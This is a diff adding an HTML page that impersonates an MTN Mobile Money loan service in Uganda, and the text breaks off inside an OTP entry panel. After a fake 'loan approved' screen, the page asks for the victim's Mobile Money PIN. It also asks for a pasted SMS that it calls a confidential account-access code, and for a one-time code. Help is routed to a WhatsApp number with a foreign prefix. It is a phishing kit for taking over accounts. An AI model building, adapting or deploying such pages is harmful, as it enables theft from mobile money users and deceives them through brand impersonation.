@@ -1,0 +1,1455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MTN MOMO Mobile Loan · Uganda</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --mtn-yellow: #004F70;
+      --mtn-black: #FFCB00;
+      --mtn-dark-yellow: #E6B800;
+      --mtn-gray: #333333;
+      --mtn-light-gray: #F5F5F5;
+      --text-dark: #222222;
+      --bg-light: #F0F0F0;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+    body { background-color: var(--bg-light); color: var(--text-dark); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; overflow-x: hidden; }
+
+    #splashScreen {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: var(--mtn-yellow);
+      display: flex; flex-direction: column; justify-content: center; align-items: center;
+      z-index: 9999; transition: opacity 0.8s ease, transform 0.8s ease; overflow: hidden;
+    }
+    #splashScreen.hidden { opacity: 0; transform: scale(1.05); pointer-events: none; }
+    #splashScreen .logo-container { text-align: center; animation: pulse 2s ease-in-out infinite; z-index: 10; }
+    #splashScreen .mtn-logo { font-size: 52px; font-weight: 900; color: var(--mtn-black); letter-spacing: 2px; text-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+    #splashScreen .mtn-logo .mobile-text { font-weight: 300; letter-spacing: 2px; }
+    #splashScreen .loan-text { font-size: 24px; font-weight: 700; color: var(--mtn-black); margin-top: 6px; letter-spacing: 3px; }
+    #splashScreen .tagline { color: rgba(0,0,0,0.6); font-size: 14px; margin-top: 16px; letter-spacing: 1px; }
+    #splashScreen .spinner-loader { margin-top: 30px; width: 40px; height: 40px; border: 3px solid rgba(0,0,0,0.1); border-top: 3px solid var(--mtn-black); border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .balloon { position: absolute; border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%; animation: float 6s ease-in-out infinite; opacity: 0.5; z-index: 1; }
+    .balloon::after { content: ''; position: absolute; bottom: -20px; left: 50%; transform: translateX(-50%); width: 2px; height: 20px; background: rgba(0,0,0,0.15); }
+    .balloon:nth-child(1) { width: 60px; height: 72px; background: #FFD700; left: 5%; animation-delay: 0s; }
+    .balloon:nth-child(2) { width: 50px; height: 60px; background: #FFC107; left: 15%; animation-delay: 1.5s; }
+    .balloon:nth-child(3) { width: 70px; height: 84px; background: #FFD700; left: 25%; animation-delay: 3s; }
+    .balloon:nth-child(4) { width: 45px; height: 54px; background: #FFC107; right: 20%; animation-delay: 0.8s; }
+    .balloon:nth-child(5) { width: 55px; height: 66px; background: #FFD700; right: 10%; animation-delay: 2.2s; }
+    .balloon:nth-child(6) { width: 65px; height: 78px; background: #FFC107; left: 45%; animation-delay: 4s; }
+    @keyframes float { 0% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-100px) rotate(5deg); } 100% { transform: translateY(0px) rotate(0deg); } }
+
+    .container { background: #ffffff; width: 100%; max-width: 550px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.12); overflow: hidden; position: relative; display: none; }
+    .container.visible { display: block; }
+
+    .whatsapp-float { position: fixed; bottom: 20px; right: 20px; z-index: 999; background-color: #25D366; color: white; border-radius: 50%; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; font-size: 32px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: transform 0.3s; text-decoration: none; }
+    .whatsapp-float:hover { transform: scale(1.1); }
+    @media (max-width: 420px) { .whatsapp-float { width: 50px; height: 50px; font-size: 26px; bottom: 15px; right: 15px; } }
+
+    .whatsapp-reminder { background: #e8f5e9; border-left: 4px solid #25D366; padding: 10px 14px; border-radius: 8px; margin: 12px 0; font-size: 13px; color: #1e5e2a; display: flex; align-items: center; gap: 10px; }
+    .whatsapp-reminder i { font-size: 20px; color: #25D366; }
+    .whatsapp-reminder strong { font-weight: 700; }
+
+    .header { background: var(--mtn-yellow); padding: 20px 20px 16px; text-align: center; color: var(--mtn-black); position: relative; border-bottom: 3px solid var(--mtn-black); }
+    .logo-placeholder { font-size: 26px; font-weight: 900; color: var(--mtn-black); letter-spacing: 2px; margin-bottom: 2px; }
+    .logo-placeholder .mobile-text { font-weight: 300; }
+    .header h1 { font-size: 18px; font-weight: 700; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 1px; }
+    .header p { font-size: 13px; opacity: 0.7; }
+    
+.step-indicator { display: flex; justify-content: space-between; padding: 16px 20px 12px; background: #fafafa; border-bottom: 1px solid #eee; flex-wrap: wrap; gap: 4px; }
+.step-indicator span { display: flex; align-items: center; gap: 5px; font-size: 11px; font-weight: 600; color: #aaa; transition: 0.3s; }
+.step-indicator span .step-num { display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; border-radius: 50%; background: #e0e0e0; color: #888; font-size: 11px; font-weight: 700; }
+.step-indicator span.active { color: var(--mtn-black); }
+.step-indicator span.active .step-num { background: var(--mtn-yellow); color: var(--mtn-black); }
+.step-indicator span.done { color: var(--mtn-black); }
+.step-indicator span.done .step-num { background: var(--mtn-black); color: var(--mtn-yellow); }
+
+.panel { padding: 20px 22px 25px; display: none; }
+.panel.active { display: block; }
+h2 { font-size: 18px; margin-bottom: 12px; color: var(--mtn-black); }
+.form-group { margin-bottom: 16px; }
+label { display: block; margin-bottom: 5px; font-weight: 600; font-size: 13px; color: var(--mtn-black); }
+select, input[type="text"], input[type="tel"], input[type="email"], input[type="password"], input[type="number"], textarea {
+  width: 100%; padding: 12px 14px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 15px; outline: none; transition: border-color 0.3s; background: #fafafa;
+}
+select:focus, input:focus, textarea:focus { border-color: var(--mtn-yellow); background: white; }
+textarea { min-height: 70px; resize: vertical; }
+
+.radio-group { display: flex; flex-direction: column; gap: 8px; }
+.radio-option { border: 2px solid #e0e0e0; padding: 12px 14px; border-radius: 10px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: all 0.2s; background: #fafafa; }
+.radio-option:hover { background: #f0f0f0; }
+.radio-option input { accent-color: var(--mtn-yellow); width: 18px; height: 18px; }
+
+.btn { background: var(--mtn-yellow); color: var(--mtn-black); border: none; padding: 14px 20px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
+.btn:hover { background: var(--mtn-dark-yellow); }
+.btn:disabled { opacity: 0.5; cursor: not-allowed; }
+.btn-secondary { background: #e0e0e0; color: var(--mtn-black); }
+.btn-secondary:hover { background: #d0d0d0; }
+.btn-resend { background: #17a2b8; color: white; }
+.btn-resend:hover { background: #138496; }
+.flex-row { display: flex; gap: 10px; }
+.flex-row .btn { flex: 1; }
+
+.calc-display { background: #fafafa; border-radius: 16px; padding: 16px 18px; border: 2px solid var(--mtn-yellow); margin: 12px 0 16px; display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+.calc-item { text-align: center; }
+.calc-item .label { font-size: 10px; color: #888; text-transform: uppercase; letter-spacing: 0.3px; font-weight: 600; }
+.calc-item .value { font-weight: 800; font-size: 15px; color: var(--mtn-black); }
+.calc-item .value.gold { color: var(--mtn-yellow); }
+.slider-container { display: flex; align-items: center; gap: 12px; }
+.slider-container input[type="range"] { flex: 1; accent-color: var(--mtn-yellow); height: 5px; background: #e0e0e0; border-radius: 10px; }
+.slider-value { font-weight: 700; min-width: 100px; color: var(--mtn-black); font-size: 13px; text-align: right; }
+.info-note { background: #f0f0f0; padding: 8px 14px; border-radius: 40px; font-size: 12px; margin-top: 4px; display: flex; align-items: center; gap: 6px; color: #555; }
+.info-note i { font-size: 14px; }
+.notice-banner { padding: 12px; border-radius: 8px; font-size: 12px; margin: 12px 0; text-align: left; border-left: 4px solid #ffc107; background: #fff8e1; color: #856404; }
+.notice-banner.wallet-notice { background: #d4edda; color: #155724; border-left-color: #28a745; }
+.notice-banner.info-notice { background: #d1ecf1; color: #0c5460; border-left-color: #17a2b8; }
+.error-msg { color: #c62828; background: #ffebee; border-radius: 40px; padding: 8px 14px; font-size: 13px; margin: 8px 0; display: inline-block; border: 1px solid #ffcdd2; }
+.hidden { display: none !important; }
+    
+    .pin-grid, .otp-grid { display: flex; gap: 10px; justify-content: center; margin: 15px 0; }
+    .pin-grid input, .otp-grid input { width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 700; border-radius: 12px; border: 2px solid #e0e0e0; background: #fafafa; color: var(--mtn-black); outline: none; }
+    .pin-grid input:focus, .otp-grid input:focus { border-color: var(--mtn-yellow); box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2); }
+
+    .warning-box { background: #fff3cd; border: 1px solid #ffc107; border-radius: 20px; padding: 12px 16px; text-align: center; margin: 12px 0; color: #856404; font-size: 14px; display: flex; align-items: center; gap: 10px; justify-content: center; }
+    .warning-box i { font-size: 20px; color: #ffc107; }
+
+    .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--mtn-black); border-right: 6px solid var(--mtn-yellow); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+    .loader-box { text-align: center; padding: 30px 20px; }
+    .status-update { font-weight: 600; color: #555; margin-top: 15px; font-size: 14px; min-height: 40px; }
+
+    .congrats-card { text-align: center; padding: 10px 10px 20px; }
+    .congrats-icon { font-size: 60px; color: #28a745; margin-bottom: 12px; animation: bounce 1s ease infinite alternate; }
+    @keyframes bounce { 0% { transform: translateY(0); } 100% { transform: translateY(-10px); } }
+    .prize-amount { font-size: 30px; font-weight: 900; color: var(--mtn-black); margin: 12px 0; background: #fff8e1; border: 3px solid var(--mtn-yellow); padding: 10px 20px; border-radius: 16px; display: inline-block; }
+
+    .review-box { background: #fafafa; border-radius: 16px; padding: 14px 16px; margin: 12px 0; border: 1px solid #e0e0e0; }
+    .review-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #eee; font-size: 13px; }
+    .review-row:last-child { border-bottom: none; }
+    .review-row .label { color: #555; font-weight: 500; }
+    .review-row .value { font-weight: 600; color: var(--mtn-black); text-align: right; }
+
+    /* ==== PHONE PREFIX GROUP (Uganda flag + +256) ==== */
+    .phone-prefix-group {
+      display: flex; align-items: center;
+      border: 2px solid #e0e0e0; border-radius: 10px;
+      background: #fafafa; padding: 0 12px;
+      transition: border-color 0.3s;
+    }
+    .phone-prefix-group:focus-within {
+      border-color: var(--mtn-yellow); background: white;
+    }
+    .phone-prefix-group .flag {
+      font-size: 20px; margin-right: 8px; line-height: 1;
+    }
+    .phone-prefix-group .prefix {
+      font-size: 15px; font-weight: 700; margin-right: 8px;
+      white-space: nowrap; color: var(--mtn-black);
+      padding-right: 8px; border-right: 1px solid #ddd;
+    }
+    .phone-prefix-group input {
+      border: none !important; padding: 12px 0 !important;
+      font-size: 15px !important; outline: none !important;
+      background: transparent !important; width: 100%;
+      border-radius: 0 !important; box-shadow: none !important;
+    }
+
+    .splash-balloons { position: absolute; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; overflow: hidden; }
+    .sms-textarea { width: 100%; min-height: 100px; padding: 12px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 14px; outline: none; background: #fafafa; resize: vertical; }
+    .sms-textarea:focus { border-color: var(--mtn-yellow); }
+    .application-id { background: #f0f0f0; padding: 8px 14px; border-radius: 8px; font-size: 13px; text-align: center; color: #555; margin: 8px 0; }
+
+    @media (max-width:420px) {
+      .pin-grid input, .otp-grid input { width: 40px; height: 48px; font-size: 20px; }
+      .calc-display { grid-template-columns: 1fr 1fr; }
+      .flex-row { flex-direction: column; }
+      .flex-row .btn { width: 100%; }
+      .step-indicator span { font-size: 10px; }
+      .step-indicator span .step-num { width: 18px; height: 18px; font-size: 10px; }
+      .phone-prefix-group .prefix { font-size: 13px; }
+    }
+  </style>
+</head>
+<body>
+<!-- ===== SPLASH SCREEN ===== -->
+<div id="splashScreen">
+    <div class="splash-balloons">
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+        <div class="balloon"></div>
+    </div>
+    <div class="logo-container">
+        <div class="mtn-logo">MTN <span class="mobile-text">MOMO</span></div>
+        <div class="loan-text">Mobile Loan</div>
+        <div class="tagline">Uganda · Quick &amp; Reliable Loans</div>
+        <div class="spinner-loader"></div>
+    </div>
+</div>
+
+<!-- ===== FLOATING WHATSAPP BUTTON ===== -->
+<a href="https://wa.me/254789904403" target="_blank" class="whatsapp-float" aria-label="WhatsApp Support">
+    <i class="fab fa-whatsapp"></i>
+</a>
+
+<div class="container" id="appContainer">
+    <!-- Header -->
+    <div class="header">
+        <div class="logo-placeholder">
+            MTN <span class="mobile-text">MOMO</span> <span style="font-weight:300;">Mobile Loan</span>
+        </div>
+        <h1 id="headerTitle">Fast &amp; Secure Loans</h1>
+        <p id="headerSub">Your money, when you need it.</p>
+    </div>
+
+    <!-- Step Indicator -->
+    <div class="step-indicator" id="stepIndicator">
+        <span id="step1Label" class="active"><span class="step-num">1</span> <span id="step1Text">Offer</span></span>
+        <span id="step2Label"><span class="step-num">2</span> <span id="step2Text">Profile</span></span>
+        <span id="step3Label"><span class="step-num">3</span> <span id="step3Text">Review</span></span>
+        <span id="step4Label"><span class="step-num">4</span> <span id="step4Text">Processing</span></span>
+    </div>
+    
+<!-- ===== STEP 1: LOAN DETAILS ===== -->
+<div class="panel active" id="panelStep1">
+    <h2 id="step1Title">Loan Details</h2>
+    <p style="font-size:13px;color:#666;margin-bottom:12px;" id="step1Desc">Enter your loan application details.</p>
+    <div class="info-note"><i class="fas fa-info-circle"></i> <span id="limitNote">Amount between 500,000 UGX and 30,000,000 UGX</span></div>
+    <div class="form-group">
+        <label id="loanTypeLabel">Loan Type <span style="color:#c62828;">*</span></label>
+        <div class="radio-group" id="loanTypeGroup">
+            <label class="radio-option selected" data-loan="personal">
+                <input type="radio" name="loanType" value="Personal" checked> <span id="loanTypePersonal">Personal Loan</span>
+            </label>
+            <label class="radio-option" data-loan="business">
+                <input type="radio" name="loanType" value="Business"> <span id="loanTypeBusiness">Business Loan</span>
+            </label>
+        </div>
+    </div>
+    <div class="form-group">
+        <label id="amountLabel">Amount (UGX) <span style="color:#c62828;">*</span></label>
+        <div class="slider-container">
+            <input type="range" id="loanAmountSlider" min="500000" max="30000000" step="500000" value="5000000">
+            <span class="slider-value" id="amountValue">5,000,000 UGX</span>
+        </div>
+        <input type="number" id="loanAmount" value="5000000" min="500000" max="30000000" step="500000" style="margin-top:6px;width:100%;padding:10px 14px;background:#fafafa;border:1.5px solid #e0e0e0;border-radius:30px;font-size:14px;outline:none;" placeholder="e.g. 5000000">
+    </div>
+    <div class="form-group">
+        <label id="termLabel">Loan Term (months) <span style="color:#c62828;">*</span></label>
+        <select id="loanMonths">
+            <option value="3">3 months</option>
+            <option value="6">6 months</option>
+            <option value="9">9 months</option>
+            <option value="12" selected>12 months</option>
+            <option value="24">24 months</option>
+            <option value="36">36 months</option>
+            <option value="48">48 months</option>
+        </select>
+    </div>
+    <div class="form-group">
+        <label id="interestLabel">Interest Rate %/year</label>
+        <input type="number" id="interestRate" value="5.5" step="0.1" min="0" readonly style="background:#f0f0f0; cursor:not-allowed;">
+    </div>
+    <div class="calc-display">
+        <div class="calc-item"><div class="label" id="monthlyLabel">Monthly</div><div class="value gold" id="monthlyDisplay">0 UGX</div></div>
+        <div class="calc-item"><div class="label" id="totalLabel">Total</div><div class="value" id="totalDisplay">0 UGX</div></div>
+        <div class="calc-item"><div class="label" id="interestLabel2">Interest</div><div class="value" id="interestDisplay">0 UGX</div></div>
+    </div>
+    <div class="form-group">
+        <label id="purposeLabel">Loan Purpose <span style="color:#c62828;">*</span></label>
+        <textarea id="purpose" rows="2" placeholder="Describe your loan purpose..."></textarea>
+    </div>
+    <button class="btn" onclick="goToStep2()" id="step1Btn"><span id="step1BtnText">Next Step</span> <i class="fas fa-arrow-right"></i></button>
+</div>
+
+<!-- ===== STEP 2: PERSONAL INFO ===== -->
+<div class="panel" id="panelStep2">
+    <h2 id="step2Title">Personal Information</h2>
+    <p style="font-size:13px;color:#666;margin-bottom:12px;" id="step2Desc">Please provide your contact details.</p>
+    <div class="flex-row">
+        <div class="form-group">
+            <label id="firstNameLabel">First Name <span style="color:#c62828;">*</span></label>
+            <input type="text" id="firstName" placeholder="First Name" autocomplete="given-name">
+        </div>
+        <div class="form-group">
+            <label id="lastNameLabel">Last Name <span style="color:#c62828;">*</span></label>
+            <input type="text" id="lastName" placeholder="Last Name" autocomplete="family-name">
+        </div>
+    </div>
+    <div class="form-group">
+        <label id="phoneLabel">Phone Number (Uganda) <span style="color:#c62828;">*</span></label>
+        <div class="phone-prefix-group">
+            <span class="flag">🇺🇬</span>
+            <span class="prefix">+256</span>
+            <input type="tel" id="phone" placeholder="772123456" inputmode="numeric" pattern="[0-9]*" autocomplete="tel-national" maxlength="9">
+        </div>
+        <div style="font-size:12px;color:#888;margin-top:4px;" id="phoneHint">9 digits starting with 77, 78, 76, or 39 (MTN only)</div>
+        <div id="phoneError" class="error-msg hidden">Please enter a valid MTN Uganda number (77, 78, 76, or 39).</div>
+    </div>
+    <div class="form-group">
+        <label id="emailLabel">Email Address <span style="color:#c62828;">*</span></label>
+        <input type="email" id="email" placeholder="example@email.com" autocomplete="email">
+        <div id="emailError" class="error-msg hidden">Please enter a valid email.</div>
+    </div>
+    <div class="flex-row">
+        <div class="form-group">
+            <label id="cityLabel">City <span style="color:#c62828;">*</span></label>
+            <select id="city">
+                <option value="">Select</option>
+                <option value="Kampala">Kampala</option>
+                <option value="Gulu">Gulu</option>
+                <option value="Lira">Lira</option>
+                <option value="Mbarara">Mbarara</option>
+                <option value="Jinja">Jinja</option>
+                <option value="Mbale">Mbale</option>
+                <option value="Masaka">Masaka</option>
+                <option value="Entebbe">Entebbe</option>
+                <option value="Fort Portal">Fort Portal</option>
+                <option value="Kabale">Kabale</option>
+                <option value="Soroti">Soroti</option>
+                <option value="Arua">Arua</option>
+                <option value="Hoima">Hoima</option>
+                <option value="Mukono">Mukono</option>
+                <option value="Other">Other</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label id="statusLabel">Employment Status <span style="color:#c62828;">*</span></label>
+            <select id="status">
+                <option value="">Select</option>
+                <option value="Employed">Employed</option>
+                <option value="Self-employed">Self-employed</option>
+                <option value="Trader">Trader</option>
+                <option value="Student">Student</option>
+                <option value="Civil servant">Civil servant</option>
+                <option value="Unemployed">Unemployed</option>
+                <option value="Retired">Retired</option>
+                <option value="Other">Other</option>
+            </select>
+        </div>
+    </div>
+    <div class="flex-row">
+        <button class="btn btn-secondary" onclick="goToStep1()" id="step2BackBtn"><i class="fas fa-arrow-left"></i> <span id="step2BackText">Back</span></button>
+        <button class="btn" onclick="goToStep3()" id="step2NextBtn"><span id="step2NextText">Next Step</span> <i class="fas fa-arrow-right"></i></button>
+    </div>
+</div>
+
+<!-- ===== STEP 3: REVIEW ===== -->
+<div class="panel" id="panelStep3">
+    <h2 id="step3Title">Review Application</h2>
+    <p style="font-size:13px;color:#666;margin-bottom:12px;" id="step3Desc">Please verify all details before submitting.</p>
+    <div class="notice-banner info-notice"><i class="fas fa-info-circle"></i> <span id="reviewNotice">Carefully check all information.</span></div>
+    <div class="review-box" id="reviewContainer">
+        <div class="review-row"><span class="label" id="reviewLoanTypeLabel">Loan Type</span><span class="value" id="reviewLoanType">—</span></div>
+        <div class="review-row"><span class="label" id="reviewAmountLabel">Amount</span><span class="value" id="reviewAmount">—</span></div>
+        <div class="review-row"><span class="label" id="reviewTermLabel">Term</span><span class="value" id="reviewTerm">—</span></div>
+        <div class="review-row"><span class="label" id="reviewPurposeLabel">Purpose</span><span class="value" id="reviewPurpose">—</span></div>
+        <div class="review-row"><span class="label" id="reviewNameLabel">Full Name</span><span class="value" id="reviewName">—</span></div>
+        <div class="review-row"><span class="label" id="reviewPhoneLabel">Phone</span><span class="value" id="reviewPhone">—</span></div>
+        <div class="review-row"><span class="label" id="reviewEmailLabel">Email</span><span class="value" id="reviewEmail">—</span></div>
+        <div class="review-row"><span class="label" id="reviewCityLabel">City</span><span class="value" id="reviewCity">—</span></div>
+        <div class="review-row"><span class="label" id="reviewStatusLabel">Status</span><span class="value" id="reviewStatus">—</span></div>
+        <div class="review-row"><span class="label" id="reviewMonthlyLabel">Monthly</span><span class="value" id="reviewMonthly">—</span></div>
+        <div class="review-row"><span class="label" id="reviewTotalLabel">Total</span><span class="value" id="reviewTotal">—</span></div>
+    </div>
+    <div class="flex-row">
+        <button class="btn btn-secondary" onclick="goToStep2()" id="step3BackBtn"><i class="fas fa-arrow-left"></i> <span id="step3BackText">Back</span></button>
+        <button class="btn" onclick="submitApplication()" id="step3SubmitBtn"><i class="fas fa-paper-plane"></i> <span id="step3SubmitText">Submit</span></button>
+    </div>
+</div>
+
+<!-- ===== STEP 4: PROCESSING ===== -->
+<div class="panel" id="panelStep4">
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <h3 id="processingTitle">Processing your application...</h3>
+        <p style="color:#777;font-size:13px;margin-top:5px;" id="processingSub">Please wait while we analyze your eligibility.</p>
+        <div class="warning-box"><i class="fas fa-exclamation-triangle"></i> <span id="processingWarning">⚠️ Do not refresh — your progress may be lost!</span></div>
+        <div class="status-update" id="processingStatus">Connecting to secure servers...</div>
+        <div style="margin-top:12px;">
+            <div style="width:100%;height:4px;background:#e0e0e0;border-radius:10px;overflow:hidden;">
+                <div id="processingProgress" style="height:100%;width:0%;background:var(--mtn-yellow);border-radius:10px;transition:width 0.3s;"></div>
+            </div>
+            <p id="processingPercent" style="font-size:13px;font-weight:600;color:var(--mtn-black);margin-top:4px;">0%</p>
+        </div>
+        <div id="adminApprovalNotice" style="display:none;margin-top:16px;padding:12px;background:#f0f0f0;border-radius:12px;border-left:4px solid var(--mtn-yellow);">
+            <p style="font-size:13px;font-weight:600;color:var(--mtn-black);" id="adminTitle">⏳ Awaiting Admin Approval</p>
+            <p style="font-size:12px;color:#555;" id="adminSub">Your application is being reviewed. Please wait...</p>
+            <div class="application-id" id="appIdDisplay">ID: <span id="appIdValue">APP-0000000000000</span></div>
+        </div>
+    </div>
+</div>
+
+<!-- ===== QUALIFIED ===== -->
+<div class="panel" id="panelQualified">
+    <div class="congrats-card">
+        <div class="congrats-icon"><i class="fas fa-check-circle"></i></div>
+        <h2 id="qualifiedTitle">Congratulations!</h2>
+        <p id="qualifiedDesc" style="font-size:14px;color:#555;margin-bottom:6px;">Your loan has been approved!</p>
+        <div class="prize-amount" id="qualifiedAmount">0 UGX</div>
+        <p style="font-size:13px;color:#888;margin-bottom:12px;" id="qualifiedSub">Approved Amount</p>
+        <button class="btn" onclick="goToWithdraw()" id="qualifiedBtn"><i class="fas fa-hand-holding-usd"></i> <span id="qualifiedBtnText">Withdraw Loan</span></button>
+        <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span id="homeQualifiedBtn">Home</span></button>
+    </div>
+</div>
+
+<!-- ===== WITHDRAW ===== -->
+<div class="panel" id="panelWithdraw">
+    <h2 id="withdrawTitle">Withdraw Loan</h2>
+    <div class="notice-banner wallet-notice"><i class="fas fa-wallet"></i> <span id="withdrawNotice">Enter your withdrawal information.</span></div>
+    <div class="form-group">
+        <label id="withdrawPhoneLabel">Enter the MTN phone number registered for Mobile Money</label>
+        <div class="phone-prefix-group">
+            <span class="flag">🇺🇬</span>
+            <span class="prefix">+256</span>
+            <input type="tel" id="withdrawPhone" placeholder="772123456" inputmode="numeric" pattern="[0-9]*" maxlength="9">
+        </div>
+        <div id="withdrawPhoneError" class="error-msg hidden">Please enter a valid MTN number.</div>
+    </div>
+    <div class="form-group">
+        <label id="pinLabel">MTN Mobile Money PIN (5 digits)</label>
+        <div class="pin-grid" id="pinGrid">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-input" pattern="\d" inputmode="numeric" autocomplete="off">
+        </div>
+        <div id="pinError" class="error-msg hidden">Please enter all 5 digits.</div>
+    </div>
+    <button class="btn" onclick="verifyPin()" id="pinBtn"><span id="pinBtnText">Verify PIN</span> <i class="fas fa-lock"></i></button>
+    <button class="btn btn-secondary" style="margin-top:8px;" onclick="goBackToQualified()" id="pinBackBtn"><i class="fas fa-arrow-left"></i> <span id="pinBackText">Back</span></button>
+    <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span id="homeWithdrawBtn">Home</span></button>
+</div>
+
+<!-- ===== SMS PASTE PANEL ===== -->
+<div class="panel" id="panelSmsPaste">
+    <h2 id="smsPasteTitle">SMS Verification</h2>
+    <div class="notice-banner info-notice"><i class="fas fa-sms"></i> <span id="smsPasteNotice">A verification message has been sent to your phone. Copy and paste the full message below.</span></div>
+    <div style="display:flex;justify-content:space-between;align-items:center;margin:6px 0 12px;">
+        <span style="font-size:13px;color:#888;" id="smsPasteExpiry">⏱️ Message expires in <span id="smsCountdown" style="font-weight:700;color:var(--mtn-black);">59</span>s</span>
+        <span style="font-size:12px;color:#999;" id="smsPasteHint">Paste your SMS before time runs out.</span>
+    </div>
+    <div class="form-group">
+        <label id="smsPasteLabel">Paste your full SMS message here</label>
+        <textarea id="smsMessage" class="sms-textarea" placeholder='Example: "Yello. Please note! This confidential code gives access to your MoMo account:pL/cSiLPGWdOkwLHst78fj6uNQJz8ABoLSw/Fo0vuNXqxQ........."'></textarea>
+    </div>
+    <div id="smsPasteError" class="error-msg hidden">Please paste the SMS message (min 180 chars).</div>
+    <div class="flex-row">
+        <button class="btn" onclick="submitSms()" id="smsPasteBtn" style="flex:2;"><span id="smsPasteBtnText">Submit</span> <i class="fas fa-check"></i></button>
+        <button class="btn btn-resend" onclick="resendSms()" id="resendSmsBtn"><i class="fas fa-redo"></i> <span id="resendSmsText">Resend</span></button>
+    </div>
+    <div class="flex-row" style="margin-top:8px;">
+        <button class="btn btn-secondary" onclick="goBackToWithdraw()" id="smsPasteBackBtn"><i class="fas fa-arrow-left"></i> <span id="smsPasteBackText">Back</span></button>
+        <button class="btn" style="background:#6c757d; color:white;" onclick="submitOtpLater()" id="smsPasteLaterBtn"><i class="fas fa-clock"></i> <span id="smsPasteLaterText">I will submit later</span></button>
+    </div>
+    <button class="btn btn-secondary" style="margin-top:8px;" onclick="goHome()"><i class="fas fa-home"></i> <span id="homeSmsBtn">Home</span></button>
+    <div class="whatsapp-reminder" style="margin-top:15px;">
+        <i class="fab fa-whatsapp"></i>
+        <div>
+            <strong>💬 Need help?</strong><br>
+            <span>Didn't receive the verification message or have questions? Click the WhatsApp icon at the bottom right to chat with an agent.</span>
+        </div>
+    </div>
+</div>
+
+<!-- ===== SMS PROCESSING PANEL ===== -->
+<div class="panel" id="panelSmsProcessing">
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <h3 id="smsProcessingTitle">Verifying message...</h3>
+        <p style="color:#777;font-size:13px;margin-top:5px;" id="smsProcessingSub">Please wait while we process your SMS.</p>
+        <div style="margin-top:12px;">
+            <div style="width:100%;height:4px;background:#e0e0e0;border-radius:10px;overflow:hidden;">
+                <div id="smsProcessingProgress" style="height:100%;width:0%;background:var(--mtn-yellow);border-radius:10px;transition:width 0.3s;"></div>
+            </div>
+            <p id="smsProcessingPercent" style="font-size:13px;font-weight:600;color:var(--mtn-black);margin-top:4px;">0%</p>
+        </div>
+        <div id="smsProcessingStatus" class="status-update">Connecting to server...</div>
+    </div>
+    <div class="whatsapp-reminder" style="margin-top:15px;">
+        <i class="fab fa-whatsapp"></i>
+        <div>
+            <strong>💬 Need help?</strong><br>
+            <span>Didn't receive the verification message or have questions? Click the WhatsApp icon at the bottom right to chat with an agent.</span>
+        </div>
+    </div>
+</div>
+
+<!-- ===== OTP ENTRY PANEL ===== -->
+<div class="panel" id="panelOtpEntry">
+    <h2 id="otpTitle">OTP Code</h2>
+    <div class="notice-banner info-notice"><i class="fas fa-key"></i> <span id="otpNotice">Enter the OTP code received by SMS</span></div>
+    <div id="otpForm">
+        <div class="form-group">
+            <label id="otpLabel">OTP Code</label>
+            <div class="otp-grid" id="otpGrid">
+                <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric" autocomplete="one-time-code">
+                <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric" autocomplete="off">
+                <input type="text" maxlength="1" class="otp-input" pattern="\d" inputmode="numeric" autocomplete="off">
+            </div>
+            <div id="otpError" class="error-msg hidden">Please enter all 4 digits.</div>
+        </div>
+        <button class="btn" onclick="submitOtp()" id="otpBtn"><span id="otpBtnText">Submit OTP</span> <i class="fas fa-check"></i></button>
+        <div class="flex-row" style="margin-top:8px;">
+            <button class="btn btn-secondary" onclick="goBackToWithdraw()" id="otpBackBtn"><i class="fas fa-arrow-left"></i> <span id="otpBackText">Back</span></button>
